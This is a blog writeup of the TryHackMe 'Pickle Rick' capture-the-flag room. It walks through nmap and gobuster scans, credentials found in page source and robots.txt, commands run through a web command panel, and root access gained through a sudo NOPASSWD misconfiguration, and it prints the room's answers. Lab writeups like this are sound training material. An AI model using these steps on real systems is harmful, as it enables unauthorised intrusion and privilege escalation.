---
title: THM - Pickle Rick
description: "\tMy first TryHackMe writeup, from enumeration and finding
  credentials to collecting Rick's three ingredients."
category: CTF · Writeup
date: 2026-04-15
---
# Challenge

A Rick and Morty CTF. Help turn Rick back into a human!

![](/images/rabbit-holes/pickle-rick/pickle-rick-challenge.png)

# Solution

## Scan

First, I ran an Nmap scan on the target IP address:

`nmap -sC -sV -oN nmapscan 10.114.168.221`

And got:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-14 12:59 -0400
Nmap scan report for 10.114.168.221
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3f:ea:82:90:3a:48:6e:cd:c3:7c:bb:2f:1a:96:91:27 (RSA)
|   256 ab:ed:cd:19:e1:75:1e:36:de:64:8f:28:91:6d:11:5d (ECDSA)
|_  256 fe:d7:83:dd:b4:9b:34:61:54:76:0c:96:a4:a8:93:d1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
```

I found:

- SSH on port 22: potential remote access
- HTTP on port 80: web application

So I opened the web page on port 80.

![](/images/rabbit-holes/pickle-rick/pickle-rick-homepage.png)

Then I opened the page source to check it:

```
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

And found `Username: R1ckRul3s`.

After looking around the website and not finding anything else, I ran a Gobuster scan:

`gobuster dir -u http://10.114.168.221 -w /usr/share/wordlists/dirb/common.txt -x php,txt`

And got:

```
robots.txt           (Status: 200) [Size: 17]
assets               (Status: 301) [Size: 317] [--> http://10.114.168.221/assets/]
index.html           (Status: 200) [Size: 1062]
login.php            (Status: 200) [Size: 882]
```

## First Ingredient

I opened `robots.txt` first and found `Wubbalubbadubdub`.

Then I moved to `login.php`.

![](/images/rabbit-holes/pickle-rick/pickle-rick-login.png)

I tried:

`Username: R1ckRul3s`  
`Password: Wubbalubbadubdub`

![](/images/rabbit-holes/pickle-rick/pickle-rick-command-panel.png)

I ran `ls -la`:

```
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

Then I tried `cat Sup3rS3cretPickl3Ingred.txt`, but the command was blocked.

![](/images/rabbit-holes/pickle-rick/pickle-rick-command-blocked-1.png)

While reading the page source, I also found a Base64-looking string:

`Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`

Decoding it didn't lead me to an ingredient, so I moved on.

I tried `strings Sup3rS3cretPickl3Ingred.txt` instead and got the first ingredient: `mr. meeseek hair`.

## Second Ingredient

I continued reading `clue.txt` and found: `Look around the file system for the other ingredient.`

I ran `ls /` and noticed two directories worth checking: `/home` and `/root`.

Inside `/home`, I found `/home/rick`.

![](/images/rabbit-holes/pickle-rick/pickle-rick-second-ingredient.png)

I ran `strings "/home/rick/second ingredients"` and got the second ingredient: `1 jerry tear`.

## Third Ingredient

The last ingredient was in `/root`, so I checked my sudo privileges with `sudo -l`:

```
Matching Defaults entries for www-data on ip-10-114-168-221:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-114-168-221:
    (ALL) NOPASSWD: ALL
```

The `NOPASSWD: ALL` entry meant I could run commands as root without a password.

So I listed the root directory:

![](/images/rabbit-holes/pickle-rick/pickle-rick-root-directory.png)

And found the third and final ingredient using `sudo strings /root/3rd.txt`: `fleeb juice`.